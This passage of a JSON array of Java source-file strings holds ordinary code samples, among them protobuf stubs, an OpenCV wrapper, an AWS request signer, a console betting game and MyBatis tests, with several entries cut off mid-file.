ExampleClient.runClient();\n    }\n}",
    "public class Q1 {\r\n    public static void main(String[] args) {\r\n        // Using string literals\r\n        String str1 = \"Hello\";\r\n        String str2 = \"Hello\";\r\n\r\n        // Using new keyword\r\n        String str3 = new String(\"Hello\");\r\n        String str4 = new String(\"Hello\");\r\n\r\n        // Demonstrate memory usage\r\n        System.out.println(\"Memory Usage:\");\r\n        System.out.println(\"str1 and str2 memory addresses: \" + System.identityHashCode(str1) + \" \" + System.identityHashCode(str2));\r\n        System.out.println(\"str3 and str4 memory addresses: \" + System.identityHashCode(str3) + \" \" + System.identityHashCode(str4));\r\n\r\n        // Demonstrate string comparison behavior\r\n        System.out.println(\"\\nString Comparison:\");\r\n        System.out.println(\"str1 == str2: \" + (str1 == str2)); // should be true, as they are the same literal\r\n        System.out.println(\"str1 == str3: \" + (str1 == str3)); // should be false, as one is a literal and one is a new object\r\n        System.out.println(\"str3 == str4: \" + (str3 == str4)); // should be false, as both are new objects with different references\r\n\r\n        // Using equals method for content comparison\r\n        System.out.println(\"\\nContent Comparison:\");\r\n        System.out.println(\"str1.equals(str2): \" + str1.equals(str2)); // should be true, as content is the same\r\n        System.out.println(\"str1.equals(str3): \" + str1.equals(str3)); // should be true, as content is the same\r\n        System.out.println(\"str3.equals(str4): \" + str3.equals(str4)); // should be true, as content is the same\r\n    }\r\n}\r\n",
    "// Generated by the protocol buffer compiler.  DO NOT EDIT!\n// source: ServiceContract.proto\n\npackage servicestubs;\n\npublic final class ServiceContract {\n  private ServiceContract() {}\n  public static void registerAllExtensions(\n      com.google.protobuf.ExtensionRegistryLite registry) {\n  }\n\n  public static void registerAllExtensions(\n      com.google.protobuf.ExtensionRegistry registry) {\n    registerAllExtensions(\n        (com.google.protobuf.ExtensionRegistryLite) registry);\n  }\n  static final com.google.protobuf.Descriptors.Descriptor\n    internal_static_grpcservice_ProtoVoid_descriptor;\n  static final \n    com.google.protobuf.GeneratedMessageV3.FieldAccessorTable\n      internal_static_grpcservice_ProtoVoid_fieldAccessorTable;\n  static final com.google.protobuf.Descriptors.Descriptor\n    internal_static_grpcservice_TextMessage_descriptor;\n  static final \n    com.google.protobuf.GeneratedMessageV3.FieldAccessorTable\n      internal_static_grpcservice_TextMessage_fieldAccessorTable;\n  static final com.google.protobuf.Descriptors.Descriptor\n    internal_static_grpcservice_IntNumber_descriptor;\n  static final \n    com.google.protobuf.GeneratedMessageV3.FieldAccessorTable\n      internal_static_grpcservice_IntNumber_fieldAccessorTable;\n  static final com.google.protobuf.Descriptors.Descriptor\n    internal_static_grpcservice_AddOperands_descriptor;\n  static final \n    com.google.protobuf.GeneratedMessageV3.FieldAccessorTable\n      internal_static_grpcservice_AddOperands_fieldAccessorTable;\n  static final com.google.protobuf.Descriptors.Descriptor\n    internal_static_grpcservice_AddResult_descriptor;\n  static final \n    com.google.protobuf.GeneratedMessageV3.FieldAccessorTable\n      internal_static_grpcservice_AddResult_fieldAccessorTable;\n  static final com.google.protobuf.Descriptors.Descriptor\n    internal_static_grpcservice_IntervalNumbers_descriptor;\n  static final \n    com.google.protobuf.GeneratedMessageV3.FieldAccessorTable\n      internal_static_grpcservice_IntervalNumbers_fieldAccessorTable;\n\n  public static com.google.protobuf.Descriptors.FileDescriptor\n      getDescriptor() {\n    return descriptor;\n  }\n  private static  com.google.protobuf.Descriptors.FileDescriptor\n      descriptor;\n  static {\n    java.lang.String[] descriptorData = {\n      \"\\n\\025ServiceContract.proto\\022\\013grpcservice\\\"\\013\\n\\t\" +\n      \"ProtoVoid\\\"\\032\\n\\013TextMessage\\022\\013\\n\\003txt\\030\\001 \\001(\\t\\\"\\036\\n\" +\n      \"\\tIntNumber\\022\\021\\n\\tintnumber\\030\\001 \\001(\\005\\\"6\\n\\013AddOper\" +\n      \"ands\\022\\r\\n\\005addID\\030\\001 \\001(\\t\\022\\013\\n\\003op1\\030\\002 \\001(\\005\\022\\013\\n\\003op2\\030\" +\n      \"\\003 \\001(\\005\\\"*\\n\\tAddResult\\022\\r\\n\\005addID\\030\\001 \\001(\\t\\022\\016\\n\\006res\" +\n      \"ult\\030\\002 \\001(\\005\\\"-\\n\\017IntervalNumbers\\022\\r\\n\\005start\\030\\001 \" +\n      \"\\001(\\005\\022\\013\\n\\003end\\030\\002 \\001(\\0052\\332\\002\\n\\007Service\\022;\\n\\007isAlive\\022\" +\n      \"\\026.grpcservice.ProtoVoid\\032\\030.grpcservice.Te\" +\n      \"xtMessage\\022B\\n\\016getEvenNumbers\\022\\026.grpcservic\" +\n      \"e.IntNumber\\032\\026.grpcservice.IntNumber0\\001\\022C\\n\" +\n      \"\\017addSeqOfNumbers\\022\\026.grpcservice.IntNumber\" +\n      \"\\032\\026.grpcservice.IntNumber(\\001\\022C\\n\\013multipleAd\" +\n      \"d\\022\\030.grpcservice.AddOperands\\032\\026.grpcservic\" +\n      \"e.AddResult(\\0010\\001\\022D\\n\\nfindPrimes\\022\\034.grpcserv\" +\n      \"ice.IntervalNumbers\\032\\026.grpcservice.IntNum\" +\n      \"ber0\\001B\\020\\n\\014servicestubsP\\001b\\006proto3\"\n    };\n    descriptor = com.google.protobuf.Descriptors.FileDescriptor\n      .internalBuildGeneratedFileFrom(descriptorData,\n        new com.google.protobuf.Descriptors.FileDescriptor[] {\n        });\n    internal_static_grpcservice_ProtoVoid_descriptor =\n      getDescriptor().getMessageTypes().get(0);\n    internal_static_grpcservice_ProtoVoid_fieldAccessorTable = new\n      com.google.protobuf.GeneratedMessageV3.FieldAccessorTable(\n        internal_static_grpcservice_ProtoVoid_descriptor,\n        new java.lang.String[] { });\n    internal_static_grpcservice_TextMessage_descriptor =\n      getDescriptor().getMessageTypes().get(1);\n    internal_static_grpcservice_TextMessage_fieldAccessorTable = new\n      com.google.protobuf.GeneratedMessageV3.FieldAccessorTable(\n        internal_static_grpcservice_TextMessage_descriptor,\n        new java.lang.String[] { \"Txt\", });\n    internal_static_grpcservice_IntNumber_descriptor =\n      getDescriptor().getMessageTypes().get(2);\n    internal_static_grpcservice_IntNumber_fieldAccessorTable = new\n      com.google.protobuf.GeneratedMessageV3.FieldAccessorTable(\n        internal_static_grpcservice_IntNumber_descriptor,\n        new java.lang.String[] { \"Intnumber\", });\n    internal_static_grpcservice_AddOperands_descriptor =\n      getDescriptor().getMessageTypes().get(3);\n    internal_static_grpcservice_AddOperands_fieldAccessorTable = new\n      com.google.protobuf.GeneratedMessageV3.FieldAccessorTable(\n        internal_static_grpcservice_AddOperands_descriptor,\n        new java.lang.String[] { \"AddID",
    "//\n// This file is auto-generated. Please don't modify it!\n//\npackage org.opencv.features2d;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport org.opencv.core.Algorithm;\nimport org.opencv.core.Mat;\nimport org.opencv.core.MatOfKeyPoint;\nimport org.opencv.utils.Converters;\n\n// C++: class Feature2D\n/**\n * Abstract base class for 2D image feature detectors and descriptor extractors\n */\npublic class Feature2D extends Algorithm {\n\n    protected Feature2D(long addr) { super(addr); }\n\n    // internal usage only\n    public static Feature2D __fromPtr__(long addr) { return new Feature2D(addr); }\n\n    //\n    // C++:  void cv::Feature2D::detect(Mat image, vector_KeyPoint& keypoints, Mat mask = Mat())\n    //\n\n    /**\n     * Detects keypoints in an image (first variant) or image set (second variant).\n     *\n     *     @param image Image.\n     *     @param keypoints The detected keypoints. In the second variant of the method keypoints[i] is a set\n     *     of keypoints detected in images[i] .\n     *     @param mask Mask specifying where to look for keypoints (optional). It must be a 8-bit integer\n     *     matrix with non-zero values in the region of interest.\n     */\n    public void detect(Mat image, MatOfKeyPoint keypoints, Mat mask) {\n        Mat keypoints_mat = keypoints;\n        detect_0(nativeObj, image.nativeObj, keypoints_mat.nativeObj, mask.nativeObj);\n    }\n\n    /**\n     * Detects keypoints in an image (first variant) or image set (second variant).\n     *\n     *     @param image Image.\n     *     @param keypoints The detected keypoints. In the second variant of the method keypoints[i] is a set\n     *     of keypoints detected in images[i] .\n     *     matrix with non-zero values in the region of interest.\n     */\n    public void detect(Mat image, MatOfKeyPoint keypoints) {\n        Mat keypoints_mat = keypoints;\n        detect_1(nativeObj, image.nativeObj, keypoints_mat.nativeObj);\n    }\n\n\n    //\n    // C++:  void cv::Feature2D::detect(vector_Mat images, vector_vector_KeyPoint& keypoints, vector_Mat masks = vector_Mat())\n    //\n\n    /**\n     *\n     *     @param images Image set.\n     *     @param keypoints The detected keypoints. In the second variant of the method keypoints[i] is a set\n     *     of keypoints detected in images[i] .\n     *     @param masks Masks for each input image specifying where to look for keypoints (optional).\n     *     masks[i] is a mask for images[i].\n     */\n    public void detect(List<Mat> images, List<MatOfKeyPoint> keypoints, List<Mat> masks) {\n        Mat images_mat = Converters.vector_Mat_to_Mat(images);\n        Mat keypoints_mat = new Mat();\n        Mat masks_mat = Converters.vector_Mat_to_Mat(masks);\n        detect_2(nativeObj, images_mat.nativeObj, keypoints_mat.nativeObj, masks_mat.nativeObj);\n        Converters.Mat_to_vector_vector_KeyPoint(keypoints_mat, keypoints);\n        keypoints_mat.release();\n    }\n\n    /**\n     *\n     *     @param images Image set.\n     *     @param keypoints The detected keypoints. In the second variant of the method keypoints[i] is a set\n     *     of keypoints detected in images[i] .\n     *     masks[i] is a mask for images[i].\n     */\n    public void detect(List<Mat> images, List<MatOfKeyPoint> keypoints) {\n        Mat images_mat = Converters.vector_Mat_to_Mat(images);\n        Mat keypoints_mat = new Mat();\n        detect_3(nativeObj, images_mat.nativeObj, keypoints_mat.nativeObj);\n        Converters.Mat_to_vector_vector_KeyPoint(keypoints_mat, keypoints);\n        keypoints_mat.release();\n    }\n\n\n    //\n    // C++:  void cv::Feature2D::compute(Mat image, vector_KeyPoint& keypoints, Mat& descriptors)\n    //\n\n    /**\n     * Computes the descriptors for a set of keypoints detected in an image (first variant) or image set\n     *     (second variant).\n     *\n     *     @param image Image.\n     *     @param keypoints Input collection of keypoints. Keypoints for which a descriptor cannot be\n     *     computed are removed. Sometimes new keypoints can be added, for example: SIFT duplicates keypoint\n     *     with several dominant orientations (for each orientation).\n     *     @param descriptors Computed descriptors. In the second variant of the method descriptors[i] are\n     *     descriptors computed for a keypoints[i]. Row j is the keypoints (or keypoints[i]) is the\n     *     descriptor for keypoint j-th keypoint.\n     */\n    public void compute(Mat image, MatOfKeyPoint keypoints, Mat descriptors) {\n        Mat keypoints_mat = keypoints;\n        compute_0(nativeObj, image.nativeObj, keypoints_mat.nativeObj, descriptors.nativeObj);\n    }\n\n\n    //\n    // C++:  void cv::Feature2D::compute(vector_Mat images, vector_vector_KeyPoint& keypoints, vector_Mat& descriptors)\n    //\n\n    /**\n     *\n     *\n     *     @param images Image set.\n     *     @param keypoints Input collection of keypoints. Keypoints for which a descriptor cannot be\n     *     computed are removed. Sometimes new keypoints can be added, for example: SIFT duplicates keypoint\n     ",
    "package dev.silenzzz.tsb.handler.command;\n\nimport dev.silenzzz.tsb.handler.command.cor.BaseCommandHandler;\nimport dev.silenzzz.tsb.handler.command.exception.CommandHandlingException;\nimport dev.silenzzz.tsb.handler.command.util.CommandHandlerCheckResult;\nimport lombok.EqualsAndHashCode;\nimport lombok.ToString;\nimport org.apache.camel.Exchange;\n\n/**\n * @author silenzzz\n * @see <a href=\"http://www.silenzzz.dev\">silenzzz.dev</a>\n * @see <a href=\"https://github.com/silenzzz\">github.com/silenzzz</a>\n * @see <a href=\"mailto:silenzzzdev@gmail.com\">silenzzz</a>\n * <p>\n * Ping command handler.\n */\n@EqualsAndHashCode(callSuper = false)\n@ToString\npublic class PingCommandHandler extends BaseCommandHandler {\n\n    @Override\n    public String getCommandValue() {\n        return \"/ping\";\n    }\n\n    @Override\n    public CommandHandlerCheckResult canHandle(Exchange exchange) {\n        return new CommandHandlerCheckResult(true, null);\n    }\n\n    @Override\n    public Exchange handle(Exchange exchange) throws CommandHandlingException {\n        return execute(exchange, e -> {\n            e.getIn().setBody(\"pong\");\n            return e;\n        });\n    }\n}\n",
    "import javax.crypto.Mac;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.security.InvalidKeyException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Locale;\nimport java.util.TimeZone;\n\npublic class AWSSigner {\n    private static final String AWS_ACCESS_KEY_ID = System.getenv(\"AWS_ACCESS_KEY_ID\");\n    private static final String AWS_SECRET_ACCESS_KEY = System.getenv(\"AWS_SECRET_ACCESS_KEY\");\n    private static final String AWS_SESSION_TOKEN = System.getenv(\"AWS_SESSION_TOKEN\");\n    private static final String RESTAPIHOST = System.getenv(\"RESTAPIHOST\");\n    private static final String RESTAPIPATH = System.getenv(\"RESTAPIPATH\");\n\n    private static final String METHOD = \"GET\";\n    private static final String SERVICE = \"execute-api\";\n    private static final String REGION = \"us-east-1\";\n    private static final String ALGORITHM = \"AWS4-HMAC-SHA256\";\n\n    public static void main(String[] args) throws IOException, NoSuchAlgorithmException {\n        // Create a datetime object for signing\n        SimpleDateFormat dateFormat = new SimpleDateFormat(\"yyyyMMdd'T'HHmmss'Z'\", Locale.US);\n        dateFormat.setTimeZone(TimeZone.getTimeZone(\"UTC\"));\n        String amzDate = dateFormat.format(new Date());\n        String dateStamp = amzDate.substring(0, 8);\n\n        // Create the canonical request\n        String canonicalUri = RESTAPIPATH;\n        String canonicalQuerystring = \"\";\n        String canonicalHeaders = \"host:\" + RESTAPIHOST + \"\\n\";\n        String signedHeaders = \"host\";\n        String payloadHash = sha256Hex(\"\");\n        String canonicalRequest = METHOD + \"\\n\" + canonicalUri + \"\\n\" + canonicalQuerystring + \"\\n\" + canonicalHeaders + \"\\n\" + signedHeaders + \"\\n\" + payloadHash;\n\n        // Create the string to sign\n        String credentialScope = dateStamp + \"/\" + REGION + \"/\" + SERVICE + \"/\" + \"aws4_request\";\n        String hashedCanonicalRequest = sha256Hex(canonicalRequest);\n        String stringToSign = ALGORITHM + \"\\n\" + amzDate + \"\\n\" + credentialScope + \"\\n\" + hashedCanonicalRequest;\n\n        // Sign the string\n        byte[] signingKey = getSignatureKey(AWS_SECRET_ACCESS_KEY, dateStamp, REGION, SERVICE);\n        String signature = hmacSha256Hex(signingKey, stringToSign);\n\n        // Add signing information to the request\n        String authorizationHeader = ALGORITHM + \" \" + \"Credential=\" + AWS_ACCESS_KEY_ID + \"/\" + credentialScope + \", \" + \"SignedHeaders=\" + signedHeaders + \", \" + \"Signature=\" + signature;\n\n        // Make the request\n        URL url = new URL(\"https://\" + RESTAPIHOST + canonicalUri);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(METHOD);\n        con.setRequestProperty(\"Host\", RESTAPIHOST);\n        con.setRequestProperty(\"x-amz-date\", amzDate);\n        con.setRequestProperty(\"x-amz-security-token\", AWS_SESSION_TOKEN);\n        con.setRequestProperty(\"Authorization\", authorizationHeader);\n\n        // Print the response\n        int responseCode = con.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            String responseBody = new String(con.getInputStream().readAllBytes(), StandardCharsets.UTF_8);\n            System.out.println(responseBody);\n        } else {\n            System.out.println(\"Error: \" + responseCode + \" \" + con.getResponseMessage());\n        }\n    }\n\n    private static byte[] getSignatureKey(String key, String dateStamp, String regionName, String serviceName) throws NoSuchAlgorithmException {\n        byte[] kSecret = (\"AWS4\" + key).getBytes(StandardCharsets.UTF_8);\n        byte[] kDate = hmacSha256(kSecret, dateStamp);\n        byte[] kRegion = hmacSha256(kDate, regionName);\n        byte[] kService = hmacSha256(kRegion, serviceName);\n        return hmacSha256(kService, \"aws4_request\");\n    }\n\n    private static String hmacSha256Hex(byte[] key, String data) throws NoSuchAlgorithmException {\n        return bytesToHex(hmacSha256(key, data));\n    }\n\n    private static byte[] hmacSha256(byte[] key, String data) {\n        try {\n            Mac mac = Mac.getInstance(\"HmacSHA256\");\n            mac.init(new SecretKeySpec(key, \"HmacSHA256\"));\n            return mac.doFinal(data.getBytes(StandardCharsets.UTF_8));\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(\"Error: HmacSHA256 algorithm not available\", e);\n        } catch (InvalidKeyException e) {\n            throw new RuntimeException(\"Error: Invalid key for HmacSHA256\", e);\n        }\n    }\n\n    private static String sha256Hex(String data) throws NoSuchAlgorithmException {\n        return bytesToHex(MessageDigest.getInstance(\"SHA-256\").digest(data.getBytes(StandardCharsets.UTF_8)));\n    }\n\n    private static String bytesToHex(byte[] bytes) {\n        StringBuilder result = ne",
    "package com.oscarliang.spotifyclone.domain.model;\n\nimport com.google.firebase.firestore.DocumentId;\n\nimport java.util.Objects;\n\npublic class Album {\n\n    @DocumentId\n    public String mId;\n    private String mTitle;\n    private String mArtist;\n    private String mYear;\n    private String mImageUrl;\n    private String mArtistId;\n\n    public Album(String id, String title, String artist, String year, String imageUrl, String artistId) {\n        mId = id;\n        mTitle = title;\n        mArtist = artist;\n        mYear = year;\n        mImageUrl = imageUrl;\n        mArtistId = artistId;\n    }\n\n    public Album() {\n        // Needed for Firebase\n    }\n\n    public String getId() {\n        return mId;\n    }\n\n    public void setId(String id) {\n        mId = id;\n    }\n\n    public String getTitle() {\n        return mTitle;\n    }\n\n    public void setTitle(String title) {\n        mTitle = title;\n    }\n\n    public String getArtist() {\n        return mArtist;\n    }\n\n    public void setArtist(String artist) {\n        mArtist = artist;\n    }\n\n    public String getYear() {\n        return mYear;\n    }\n\n    public void setYear(String year) {\n        mYear = year;\n    }\n\n    public String getImageUrl() {\n        return mImageUrl;\n    }\n\n    public void setImageUrl(String imageUrl) {\n        mImageUrl = imageUrl;\n    }\n\n    public String getArtistId() {\n        return mArtistId;\n    }\n\n    public void setArtistId(String artistId) {\n        mArtistId = artistId;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) {\n            return true;\n        }\n        if (o == null || getClass() != o.getClass()) {\n            return false;\n        }\n        Album album = (Album) o;\n        return Objects.equals(mTitle, album.mTitle)\n                && Objects.equals(mArtist, album.mArtist)\n                && Objects.equals(mYear, album.mYear)\n                && Objects.equals(mImageUrl, album.mImageUrl);\n    }\n\n}\n",
    "import java.util.Scanner;\r\nimport java.io.IOException;\r\nimport java.util.Random;\r\npublic class Lotofacil {\r\n\r\n    public static void main(String[] args) {\r\n       Scanner scanner = new Scanner(System.in);\r\n         int opcoesMenu;\r\n\r\n\r\n         System.out.println(\"*****************\");\r\n            System.out.println(\"Menu LOTOFACIL:\");\r\n            System.out.println(\"1) Apostar de 0 a 100\");\r\n            System.out.println(\"2) Apostar de A a Z\");\r\n            System.out.println(\"3) Apostar em par ou impar\");\r\n            System.out.println(\"0) Sair\");\r\n            System.out.println(\"*****************\");\r\n            System.out.print(\"Escolha uma opcao: \");\r\n            \r\n       do {\r\n                opcoesMenu = scanner.nextInt();\r\n\r\n                    switch (opcoesMenu) {\r\n                \r\n                case 1:\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Jogo escolhido:\");\r\n                    System.out.println(\"Apostar de 0 a 100\");\r\n                    System.out.println(\"*******************\");\r\n                    Scanner meuNumero = new Scanner(System.in);\r\n                        System.out.println(\"Digite o seu numero de aposta: \");\r\n                        int numeroInformado = meuNumero.nextInt();\r\n                        if (numeroInformado < 0 || numeroInformado > 100) {\r\n                            System.out.println(\"Aposta invalida. O numero deve estar entre 0 e 100!\");\r\n                            System.out.println(\"Digite 0 para sair ou 1 para jogar novamente.\");\r\n                            }else {\r\n                                Random gerador = new Random();\r\n                                int numeroSorteado = gerador.nextInt(100);\r\n                                System.out.println(\"O seu numero digitado foi: \" + numeroInformado);\r\n                                System.out.println(\"O numero sorteado e: \" + numeroSorteado);\r\n                                    if (numeroInformado == numeroSorteado) {\r\n                                        System.out.println(\"Parabens! Voce acertou e ganhou R$1.000,00\");\r\n                                    }else {\r\n                                        System.out.println(\"Que pena! Voce errou!\");\r\n                                    }\r\n                                System.out.println(\"Digite 0 para sair.\");\r\n                            }\r\n                    break;\r\n                \r\n                case 2:\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Jogo escolhido:\");\r\n                    System.out.println(\"Apostar de A a Z\");\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Digite uma letra de A a Z: \");   \r\n                    char letraPremiada = 'G';\r\n                    try {\r\n                        int codigoAscii = System.in.read();\r\n                        char letraAposta = Character.toUpperCase((char) codigoAscii);\r\n                        System.out.println(\"A letra apostada foi:\" + \" \" + letraAposta);\r\n                        if (Character.isLetter(letraAposta)) {\r\n                            if (letraAposta == letraPremiada) {\r\n                                System.out.println(\"Voce ganhou R$ 500,00 reais.\");\r\n                            }else {\r\n                                System.out.println(\"Que pena! A letra sorteada foi: \" + letraPremiada);\r\n                            }\r\n                        }else {\r\n                            System.out.println(\"Aposta inv\u00e1lida. Digite uma letra de A a Z.\");\r\n                        }\r\n                    } catch (IOException e) {\r\n                        System.out.println(\"Erro ao ler a entrada.\");\r\n                        e.printStackTrace();\r\n                    }\r\n                    \r\n                break;\r\n                \r\n                case 3:\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Jogo escolhido:\");\r\n                    System.out.println(\"Apostar em par ou impar\");\r\n                    System.out.println(\"*******************\");\r\n                    Scanner parOuImpar = new Scanner(System.in);\r\n                    System.out.println(\"Digite um numero: \");\r\n                    int nParOuImpar = parOuImpar.nextInt();\r\n                    if (nParOuImpar % 2 == 0) {\r\n                        System.out.println(\"O numero \" + nParOuImpar + \" e par.\");\r\n                        System.out.println(\"Parabens. Voce ganhou R$100,00\");\r\n                        }else {\r\n                            System.out.println(\"O numero \" + nParOuImpar + \" e impar.\");\r\n                            System.out.println(\"Que pena, voce perdeu. A premiacao era apenas para numeros pares.\");\r\n                            System.out.println(\"Digite 0 para sair.\");\r\n                        }\r\n\r\n\r\n                    break;\r\n                case 0:\r\n        ",
    "package com.arcane.arithmetic;\n\nimport javafx.fxml.FXML;\n\nimport java.awt.Desktop;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\nimport javafx.event.ActionEvent;\nimport javafx.fxml.FXMLLoader;\nimport javafx.scene.Node;\nimport javafx.scene.Parent;\nimport javafx.scene.Scene;\nimport javafx.stage.Stage;\n\n/**\n * This is the Topic Controller, used for controls and events in the ChooseTopic scene.\n * \n * @author Ming Chun Chan\n * @author Justin Xu\n * @author Candice Williams\n */\npublic class TopicController {\n\tprivate static String topic;\n\t/**\n\t * Save calculus as the topic\n\t * Switch to the ChooseDifficulty scene\n\t * @param event the calculus button is pressed\n\t * @throws IOException if error initialising Stage variable\n\t * @see StartController\n\t */\n\tpublic void calculus(ActionEvent event) throws IOException {\n\t\tthis.topic = \"calculus\";\n\t\tStartController SCCon = new StartController();\n\t\tSCCon.switchToDifficulty(event);\n\t}\n\t/**\n\t * Save algebra as the topic\n\t * Switch to the ChooseDifficulty scene\n\t * @param event the algebra button is pressed\n\t * @throws IOException if error initialising Stage variable \n\t * @see StartController\n\t */\n\tpublic void algebra(ActionEvent event) throws IOException {\n\t\ttopic = \"algebra\";\n\t\tStartController SCCon = new StartController();\n\t\tSCCon.switchToDifficulty(event);\n\t}\n\t/**\n\t * Save stats as the topic\n\t * Switch to the ChooseDifficulty scene\n\t * @param event the stats button is pressed\n\t * @throws IOException if error initialising Stage variable\n\t * @see StartController\n\t */\n\tpublic void stats(ActionEvent event) throws IOException {\n\t\ttopic = \"statistics\";\n\t\tStartController SCCon = new StartController();\n\t\tSCCon.switchToDifficulty(event);\n\t}\n\t/**\n\t * @return the chosen topic for the game\n\t */\n\tpublic String getTopic() {\n\t\treturn topic;\n\t}\n\t/**\n\t * Switch back to the start menu\n\t * @param event\n\t * @throws IOException if error initialising Stage variable\n\t * @see StartController\n\t */\n\tpublic void switchToStart(ActionEvent event) throws IOException {\n\t\tStartController SCCon = new StartController();\n\t\tSCCon.switchToStartMenu(event);\n\t}\n\t/**\n\t * Open a calculus tutorial link on your browser\n\t * @param event calculus info button is pressed\n\t * @throws IOException if error initialising Desktop\n\t * @throws URISyntaxException if URI does not exist\n\t */\n\tpublic void calculusLink(ActionEvent event) throws URISyntaxException, IOException {\n\t\tDesktop.getDesktop().browse(new URI(\"https://www.youtube.com/watch?v=HfACrKJ_Y2w\"));\n\t}\n\t/**\n\t * Open an algebra tutorial link on your browser\n\t * @param event calculus info button is pressed\n\t * @throws IOException if error initialising Desktop\n\t * @throws URISyntaxException if URI does not exist\n\t */\n\tpublic void algebraLink(ActionEvent event) throws IOException, URISyntaxException {\n\t\tDesktop.getDesktop().browse(new URI(\"http://www.youtube.com/watch?v=JnTa9XtvmfI\"));\n\t}\n\t/**\n\t * Open an intro stats tutorial link on your browser\n\t * @param event calculus info button is pressed\n\t * @throws IOException if error initialising Desktop\n\t * @throws URISyntaxException if URI does not exist\n\t */\n\tpublic void statsLink(ActionEvent event) throws IOException, URISyntaxException {\n\t\tDesktop.getDesktop().browse(new URI(\"https://www.youtube.com/watch?v=xxpc-HPKN28\"));\n\t}\n}",
    "package com.xssssss.xskeepfoodsaturation.utils;\n\nimport com.xssssss.xskeepfoodsaturation.XsKeepFoodSaturation;\n\nimport java.util.List;\nimport java.util.logging.Logger;\n\npublic class utils {\n    private final Logger logger = Logger.getLogger(\"utils\");\n    private final XsKeepFoodSaturation main;\n    public utils(XsKeepFoodSaturation main) {\n        this.main = main;\n    }\n    public boolean isEnableWorld(String mode, String world){\n        List<String> worldlist = (List<String>)main.config.get(\"enableWorlds.list\");\n        if (!(mode.equalsIgnoreCase(\"ALL\") || mode.equalsIgnoreCase(\"WHITELIST\") || mode.equalsIgnoreCase(\"BLACKLIST\"))) {\n            logger.warning(\"[XsKeepFoodSaturation] config.yml\u4e2d\u7684\\\"enableWorlds.mode\\\"\u53ea\u80fd\u4e3a\\\"ALL/WHITELIST/BLACKLIST\\\"\uff0c\u5df2\u542f\u7528\u9ed8\u8ba4\u6a21\u5f0f\\\"ALL\\\"\uff01\");\n            mode = \"ALL\";\n        }\n        switch (mode){\n            case \"ALL\":\n                return true;\n            case \"WHITELIST\":\n                if (worldlist.contains(world)) {\n                    return true;\n                }else { return false; }\n            case \"BLACKLIST\":\n                if (worldlist.contains(world)) {\n                    return false;\n                }else { return true; }\n        }\n        return true;\n    }\n}\n",
    "package com.example.mybatis.test;\r\n\r\nimport com.example.mybatis.mapper.StudentMapper;\r\nimport com.example.mybatis.pojo.Student;\r\nimport org.apache.ibatis.io.Resources;\r\nimport org.apache.ibatis.session.SqlSession;\r\nimport org.apache.ibatis.session.SqlSessionFactory;\r\nimport org.apache.ibatis.session.SqlSessionFactoryBuilder;\r\nimport org.junit.Test;\r\n\r\nimport java.io.IOException;\r\nimport java.io.InputStream;\r\nimport java.util.List;\r\n\r\npublic class MybatisTest {\r\n\r\n    @Test\r\n    public void testMybatis() throws IOException {\r\n        //\u52a0\u8f7d\u6838\u5fc3\u914d\u7f6e\u6587\u4ef6\r\n        InputStream is= Resources.getResourceAsStream(\"mybatis-config.xml\");\r\n        //\u83b7\u53d6sqlsessionFactoryBuilder\r\n        SqlSessionFactoryBuilder sqlSessionFactoryBuilder=new SqlSessionFactoryBuilder();\r\n        //\u83b7\u53d6\r\n        SqlSessionFactory sqlSessionFactory= sqlSessionFactoryBuilder.build(is);\r\n        //\u83b7\u53d6sqlsession\r\n        SqlSession sqlSession=sqlSessionFactory.openSession(true);\r\n        //\u83b7\u53d6mapper\u63a5\u53e3\u5bf9\u8c61\r\n        StudentMapper studentMapper= sqlSession.getMapper(StudentMapper.class);\r\n        int result=studentMapper.insertStudent();\r\n        //\u63d0\u4ea4\u4e8b\u7269\r\n//        sqlSession.commit();\r\n        System.out.println(\"result:\"+result);\r\n    }\r\n\r\n\r\n    @Test\r\n    public void testUpdate() throws IOException {\r\n        InputStream is=Resources.getResourceAsStream(\"mybatis-config.xml\");\r\n        SqlSessionFactoryBuilder sqlSessionFactoryBuilder=new SqlSessionFactoryBuilder();\r\n        SqlSessionFactory sqlSessionFactory=sqlSessionFactoryBuilder.build(is);\r\n        SqlSession sqlSession=sqlSessionFactory.openSession(true);\r\n        StudentMapper studentMapper=sqlSession.getMapper(StudentMapper.class);\r\n        studentMapper.updateStudent();\r\n\r\n    }\r\n\r\n    @Test\r\n    public void testDelete() throws IOException {\r\n        InputStream is=Resources.getResourceAsStream(\"mybatis-config.xml\");\r\n        SqlSessionFactoryBuilder sqlSessionFactoryBuilder=new SqlSessionFactoryBuilder();\r\n        SqlSessionFactory sqlSessionFactory=sqlSessionFactoryBuilder.build(is);\r\n        SqlSession sqlSession=sqlSessionFactory.openSession(true);\r\n        StudentMapper studentMapper=sqlSession.getMapper(StudentMapper.class);\r\n        studentMapper.deleteStudent();\r\n\r\n    }\r\n\r\n    @Test\r\n    public void testQuery() throws IOException {\r\n        InputStream is=Resources.getResourceAsStream(\"mybatis-config.xml\");\r\n        SqlSessionFactoryBuilder sqlSessionFactoryBuilder=new SqlSessionFactoryBuilder();\r\n        SqlSessionFactory sqlSessionFactory=sqlSessionFactoryBuilder.build(is);\r\n        SqlSession sqlSession=sqlSessionFactory.openSession(true);\r\n        StudentMapper studentMapper=sqlSession.getMapper(StudentMapper.class);\r\n        List<Student> students= studentMapper.getAllStudent();\r\n        students.forEach(student -> System.out.println(student));\r\n\r\n    }\r\n}\r\n",
